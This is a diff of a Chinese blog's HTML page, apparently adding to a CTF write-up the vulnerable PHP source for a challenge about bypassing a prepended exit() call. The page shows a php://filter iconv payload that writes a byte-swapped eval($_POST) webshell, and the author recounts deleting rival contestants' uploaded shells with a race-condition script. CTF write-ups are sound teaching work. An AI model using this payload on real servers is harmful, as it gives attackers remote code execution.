@@ -180,7 +180,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/代码审计安全/">
-                    代码审计安全 <span class="right">9 篇</span></a>
+                    代码审计安全 <span class="right">10 篇</span></a>
                 </a>
             </li>
 
@@ -196,7 +196,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/Web渗透测试/">
-                    Web渗透测试 <span class="right">23 篇</span></a>
+                    Web渗透测试 <span class="right">24 篇</span></a>
                 </a>
             </li>
 
@@ -204,7 +204,7 @@
 
             <li class="collapse-level-0" collapse-level="0">
                 <a class="no-padding" href="/categories/CTF笔记/">
-                    CTF笔记 <span class="right">15 篇</span></a>
+                    CTF笔记 <span class="right">16 篇</span></a>
                 </a>
             </li>
 
@@ -318,6 +318,9 @@
                 <h2 id="2020全国大学生WEB安全测试预选赛WriteUp"><a href="#2020全国大学生WEB安全测试预选赛WriteUp" class="headerlink" title="2020全国大学生WEB安全测试预选赛WriteUp"></a>2020全国大学生WEB安全测试预选赛WriteUp</h2><p>​    加油一步一个脚印吧！这次比赛又学习到了很多，慕测的赛事时间相比其它CTF比赛比较紧凑，13：00-17：00有十道WEB题，虽然相比CTF题的难度是简单一些，但我也只做出4道题，怎么说呢，还是很菜，很菜，加油就好。</p>
 <p>​    下面仅简单记录几道题的payload和思路，因为现在是10.25的凌晨0:02。emmm，今天是我的生日，玩的很嗨，请了8个朋友/卓越班同学去吃电台巷火锅，挺好吃的，不知道是因为心情还是真的好吃。再多说几句，喜欢电台巷的红糖糍粑、鲜鸭血和牛蛙。红糖糍粑是现炸的很酥香；鲜鸭血真的很鲜，红红的特别好使；牛蛙是我第一次在牛油锅里涮着吃，很嫩很好吃。不仅还想感叹，自己明年就毕业了，这大概是大学期间最后一个生日了吧，步入了社会就再也没有假期了…突然有些伤感，但是还是要回到正题，说了这么多只是想说今天很晚了，WP就不写那么详细了，简单记录一下印象深刻的思路吧。</p>
 <h3 id="一、绕过-lt-php-exit-gt"><a href="#一、绕过-lt-php-exit-gt" class="headerlink" title="一、绕过&lt;php? exit(); ?&gt;"></a>一、绕过&lt;php? exit(); ?&gt;</h3><p>​    这道题，我搜索相似，模仿的payload，深入原理并没有弄得特别懂，日后一定要好好学习一下php://filter的相关骚操作。另外说一句，这道题搅屎棍很多，因为写入了一句话后，总有人删除别人上传的木马，我就被删了几次，故一怒之下写了一波条件竞争的py脚本，删除上传目录中的所有文件，且写入自己的一句话。emmm，自己成了搅屎棍了。</p>
+<p>​    源代码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">chdir(<span class="string">&quot;sandbox&quot;</span>);</span><br><span class="line">$filename = $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">$data = <span class="string">&#x27;&lt;?php exit();?&gt; &#x27;</span> . $filename;</span><br><span class="line">file_put_contents($filename,$data);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>​    Payload：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php:<span class="comment">//filter/convert.iconv.UCS-2LE.UCS-2BE| ?&lt;hp pvela$(P_SO[T11)] ;&gt;?/resource=f.php</span></span><br></pre></td></tr></table></figure>
 
